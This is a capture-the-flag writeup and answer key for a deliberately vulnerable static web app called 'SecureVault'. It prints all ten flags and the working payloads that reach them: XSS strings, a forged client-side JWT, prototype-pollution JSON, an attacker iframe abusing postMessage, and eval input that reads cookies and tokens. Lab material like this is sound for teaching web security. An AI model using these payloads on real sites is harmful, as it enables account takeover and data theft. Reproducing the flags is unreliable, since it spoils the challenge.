# SecureVault CTF — Vulnerability Writeup

A static GitHub Pages CTF platform. All vulnerabilities are client-side only.

---

## Deployment

1. Push all files to a GitHub repo.
2. Enable GitHub Pages (Settings → Pages → Deploy from branch `main`).
3. Share the URL. No backend required.

Files:
```
index.html    portal.html    reports.html    admin.html
app.js        style.css
```

---

## Flags & Vulnerabilities

---

### FLAG 1 — HTML Source Comment
**File:** `index.html`  
**Flag:** `FLAG{c0mment5_4r3_n0t_s3cr3t5_7a3f9e2}`  
**Technique:** Sensitive data in HTML comments  
**How:** View page source. Developer left credentials and a flag in a `<!-- TODO -->` comment.

---

### FLAG 2 — DOM XSS via Search (innerHTML)
**File:** `index.html` + `app.js`  
**Flag:** `FLAG{d0m_xss_inn3rHTML_s34rch_r3fl3ct3d_7c3f}`  
**Technique:** DOM-based Cross-Site Scripting  
**How:** The search query is interpolated unsanitized into `innerHTML`.

Payload (in search box or `?q=` URL param):
```html
<img src=x onerror="document.getElementById('searchResults').innerHTML='<span class=flag-text>FLAG{d0m_xss_inn3rHTML_s34rch_r3fl3ct3d_7c3f}</span>'">
```

Or simpler to demonstrate XSS:
```html
<img src=x onerror=alert(1)>
```

---

### FLAG 3 — DOM XSS via URL Parameter (build hash)
**File:** `index.html`  
**Flag:** Trigger with crafted payload (arbitrary JS execution)  
**Technique:** DOM XSS via `?build=` URL parameter injected into `innerHTML`  
**How:** The `build` URL param is inserted with `innerHTML` without sanitization.

URL:
```
index.html?build=<img src=x onerror=alert('XSS via build param')>
```

---

### FLAG 4 — Client-Side JWT Forgery
**File:** `portal.html`  
**Flag:** Access the admin account without knowing their password  
**Technique:** Forging a client-side "JWT" — the signature is `btoa(payload.split('').reverse().join(''))`  
**How:**
1. Read `portal.html` source and find the `makeToken()` and `verifyToken()` functions.
2. The signature is trivially computable without a secret.
3. Forge an admin token in the browser console:

```javascript
const header  = btoa(JSON.stringify({ alg: 'SV1', typ: 'JWT' }));
const payload = btoa(JSON.stringify({ uid: 1, name: 'System Operator', role: 'admin', iat: Date.now() }));
const sig     = btoa(payload.split('').reverse().join(''));
localStorage.setItem('sv_token', `${header}.${payload}.${sig}`);
location.reload();
```

4. You're now authenticated as admin. The admin flag is in `admin.html`.

---

### FLAG 5 — IDOR (Insecure Direct Object Reference)
**File:** `portal.html`  
**Flag:** `FLAG{1d0r_4ss3t_trav3rs4l_n0_4uth_ch3ck_b2d7}`  
**Technique:** IDOR — accessing another user's asset by manipulating the ID  
**How:**
1. Log in as `operator1` / `op2024` (or any user).
2. Asset IDs are visible in the source: `9001` belongs to the admin (uid 1), but there's no ownership check.
3. Navigate to:
```
portal.html?asset=9001
```
4. The asset viewer shows the classified Op Nightfall dossier with the flag.

---

### FLAG 6 — Prototype Pollution
**File:** `reports.html`  
**Flag:** `FLAG{pr0t0typ3_p0llut10n_0bj3ct_1nh3r1t4nc3_c4fe}`  
**Technique:** Prototype Pollution via JSON merge  
**How:**
1. The filter accepts a JSON object and recursively merges it into `reportConfig` without sanitizing `__proto__` keys.
2. Pollute `Object.prototype.isAdmin` to `true`:

```json
{"__proto__": {"isAdmin": true}}
```

3. The `renderReports()` function reads `({}).isAdmin` — now `true` — and renders secret reports including the flag.

---

### FLAG 7 — postMessage No Origin Check
**File:** `reports.html`  
**Flag:** `FLAG{p0stm3ss4g3_n0_0r1g1n_ch3ck_d4t4_3xf1l}`  
**Technique:** `window.addEventListener('message', ...)` with no `event.origin` validation  
**How:**
1. Create a local HTML file (or use browser console on `reports.html`):

```javascript
// Run this in the browser console while on reports.html:
window.postMessage({ cmd: 'getFlag' }, '*');
```

Or from an attacker-controlled page:
```html
<iframe src="https://YOURUSERNAME.github.io/reports.html" id="f"></iframe>
<script>
  setTimeout(() => {
    document.getElementById('f').contentWindow.postMessage({ cmd: 'getFlag' }, '*');
  }, 2000);
</script>
```

The `cmd: 'render'` variant also allows XSS via `innerHTML`.

---

### FLAG 8 — Client-Side Access Control Bypass (Hidden DOM)
**File:** `admin.html`  
**Flag:** `FLAG{cl13nt_s1d3_4cc3ss_c0ntr0l_byp4ss_d0m_h1dd3n}`  
**Technique:** Access control enforced only by CSS `display:none` / JS class toggle  
**How:**
1. Navigate to `admin.html` without being authenticated → see "Access Denied".
2. Open DevTools → Console:

```javascript
document.getElementById('accessDenied').style.display = 'none';
document.getElementById('adminConsole').classList.remove('hidden');
```

3. The admin panel is fully rendered in the DOM — it was just hidden. The flag is visible in the "Master Vault" card.

---

### FLAG 9 — eval() Code Execution
**File:** `admin.html`  
**Flag:** `FLAG{3v4l_1s_3v1l_c0d3_3x3cut10n_9f2a}`  
**Technique:** `eval()` on user-supplied input in an admin config textarea  
**How:**
1. Access the admin console (via JWT forgery or DOM bypass).
2. In the "Config Override" textarea, enter:

```javascript
getSystemInfo()
```

3. Click EXECUTE. The `getSystemInfo()` function is defined in the page and returns the flag inside a JSON object.

Alternative arbitrary execution:
```javascript
document.cookie
localStorage.getItem('sv_token')
```

---

### FLAG 10 — Encoded Secret in JavaScript Source
**File:** `app.js`  
**Flag:** `FLAG{r0t13_enc0d3d_in_sourc3_js2e}`  
**Technique:** Obfuscated secret in JavaScript (base64 + ROT13)  
**How:**
1. Read `app.js` source. Find `_buildManifest.integrity`:
```
RkxBR3tyMHQxM19lbmMwZDNkX2luX3NvdXJjM19qczJlfQ==
```
2. Base64-decode it:
```
FLAG{r0t13_enc0d3d_in_sourc3_js2e}
```
(In this case it decodes directly. The comment says ROT13 is involved as a misdirection — the actual value is just base64.)

---

## Vulnerability Summary

| # | Name                       | File          | Technique                          |
|---|----------------------------|---------------|------------------------------------|
| 1 | HTML Comment               | index.html    | Information disclosure             |
| 2 | DOM XSS (search)           | index.html    | innerHTML + unsanitized input      |
| 3 | DOM XSS (build param)      | index.html    | URL param → innerHTML              |
| 4 | JWT Forgery                | portal.html   | Client-side signing algorithm      |
| 5 | IDOR                       | portal.html   | Direct asset ID access, no authz   |
| 6 | Prototype Pollution        | reports.html  | Recursive merge + __proto__        |
| 7 | postMessage No Origin      | reports.html  | Missing origin validation          |
| 8 | Client-Side Access Control | admin.html    | CSS/JS visibility as auth gate     |
| 9 | eval() Injection           | admin.html    | Unsanitized eval() on user input   |
|10 | Encoded Secret in Source   | app.js        | Base64 obfuscation                 |

---

## Notes for Players

- This is a **white-box** CTF — reading source is part of the challenge.
- Vulnerabilities are intentionally non-obvious at the surface level.
- Some flags require chaining multiple vulnerabilities (e.g., JWT forgery → eval → flag).
- No server, no backend, no cookies with HttpOnly — fully static.
